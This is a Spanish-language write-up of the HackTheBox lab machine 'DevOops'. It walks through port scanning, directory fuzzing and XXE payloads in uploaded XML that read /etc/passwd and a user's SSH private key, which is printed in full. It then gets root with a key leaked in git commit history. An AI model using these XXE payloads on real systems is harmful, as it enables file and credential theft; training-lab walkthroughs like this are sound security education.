# Máquina "DevOops" de HackTheBox

## Características

- Linux  
- Media 
- XXE (XML External Entity Injection) Exploitation Reading internal files through XXE 
- Private SSH Key Abusing a Github project 
- Information Leakage in Project Commits [Privilege Escalation]

**Útil en:**
- eWPT 
- OSWE

**IP:** 10.10.10.91

## Escaneo de puertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.91 -oG allports
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

Escaneo detallado:

```bash
nmap -sV -sC -p 22,5000 10.10.10.91
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Codename (versión determinada):** Ubuntu Xenial

## Reconocimiento web

Lanzamos whatweb:

```bash
whatweb http://10.10.10.91:5000
```

Nos devuelve:
```
http://10.10.10.91:5000 [200 OK] Country[RESERVED][ZZ], HTTPServer[gunicorn/19.7.1], IP[10.10.10.91]
```

Hacemos `Ctrl + U` para ver el código fuente. Revisamos headers y como nada funcionó, nos pondremos a fuzzear con Gobuster:

```bash
sudo gobuster dir -u http://10.10.10.91:5000 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x php
```

Donde:
- `-t 200` = 200 hilos
- `-x php` = archivos con extensión php

![Upload directory](/secciones/posts/imagenes/devoops/upload1.png)

## Explotación XXE

Probamos creando un archivo `.xml` con cualquier texto. Lo cargamos y devuelve error. Intentaremos con el siguiente formato:

```xml
<entry>
<Author>0xdf</Author>
<Subject>Testing</Subject>
<Content>This is a test</Content>
</entry>
```

Y obtenemos esta respuesta:

```
HTTP/1.1 200 OK
Server: gunicorn/19.7.1
Date: Mon, 04 Jun 2018 19:17:00 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 163

 PROCESSED BLOGPOST:
  Author: 0xdf
 Subject: Testing
 Content: This is a test
 URL for later reference: /uploads/test.xml
 File path: /home/roosa/deploy/src
```

Es más, el archivo está donde dicen que está:

```bash
curl http://10.10.10.91:5000/uploads/test.xml
```

```xml
<item>
<Author>test</Author>
<Subject>Testing</Subject>
<Content>This is a test</Content>
</item>
```

Como el input ingresado en el XML es procesado, podemos intentar alterarlo para aprovecharnos de esto con External Entity Injection (XXE). Vamos a Google y buscamos "XXE PortSwigger", así que vamos a declarar una entidad: https://portswigger.net/web-security/xxe

Haremos el siguiente archivo XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<elements>
    <Author>&xxe;</Author>
    <Subject>si</Subject>
    <Content>no</Content>
</elements>
```

Lo que hace esto es:
- `<!DOCTYPE foo` = formato file
- `<!ENTITY xxe` = leer el archivo y devolverlo en Author

¡Y funciona! Tenemos el `/etc/passwd` de la máquina víctima. Así que se acontece el XXE, así que intentaremos ver las claves privadas de SSH:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa"> ]>
<elements>
    <Author>&xxe;</Author>
    <Subject>SSH Key</Subject>
    <Content>Private Key</Content>
</elements>
```

Obtenemos:

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
-----END RSA PRIVATE KEY-----
```

Copiamos la clave en nuestro lado como `id_rsa`, le damos permisos 600 para que solo el propietario y el admin puedan leer la clave:

```bash
chmod 600 id_rsa
```

Nos conectamos como roosa por SSH:

```bash
ssh roosa@10.10.10.91 -i ~/id_rsa_devoops_roosa
```

¡Y somos roosa! Buscamos la flag de user.

## Escalamiento a root

Lanzamos:

```bash
id
```

```
uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)
```

Somos parte del grupo `adm`. Estando en el grupo adm podemos leer los logs del sistema.

Lanzamos:

```bash
ls -l /var/log/
lsb_release -a  # para ver la versión de Ubuntu
```

Tratamos de husmear un poco. Vemos directorios raros como `work`. Ingresamos y vemos un archivo `readme.md`. Lanzamos:

```bash
ls -la
```

Estamos dentro de un proyecto GitHub, así que lanzamos:

```bash
find .
```

Nos mostrará todos los recursos dentro, incluidos `/resources/integration/authcredentials.key`.

Le hacemos un `cat` y es una clave tipo SSH, quizás de root. La copiamos en nuestra máquina atacante como `id_rsa`, le damos permisos 600 e intentamos entrar sin conseguirlo.

Continuamos revisando, así que vamos a `blogfeed` y dentro de `work` lanzamos:

```bash
ls -la
```

Nuevamente, como es un proyecto de GitHub, podemos listar los commits que han habido en el proyecto lanzando:

```bash
git log
```

Nos mostrará varios logs con notas y cambios respectivos. Copiamos el código de commit:

![Git commit](/secciones/posts/imagenes/devoops/comit1.png)

```bash
git log -p ca3e768f2434511e75bd5137593895bd38e1b1c2
```

Nos muestra los cambios implementados a nivel de código. Hay uno que dice "reverted accidental commit with proper key". Buscamos por el código y es una clave privada que fue cambiada, así que copiamos la clave, vamos al directorio `/tmp`, la agregamos como `id_rsa`, le damos permisos 600 e ingresamos como root por SSH:

```bash
ssh -i id_rsa root@localhost
```

¡Y somos root!

---

**Nota:** Algunos de los writeups en esta página pueden tener contenido de otras páginas o tener muy pocas imágenes, esto debido a que en algunas de las máquinas que realicé no tomé los apuntes o no tomé capturas de pantalla, así que he decidido buscar varios writeups y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí. También, si encuentras faltas de ortografía o cualquier error, puedes contactarme a mi correo.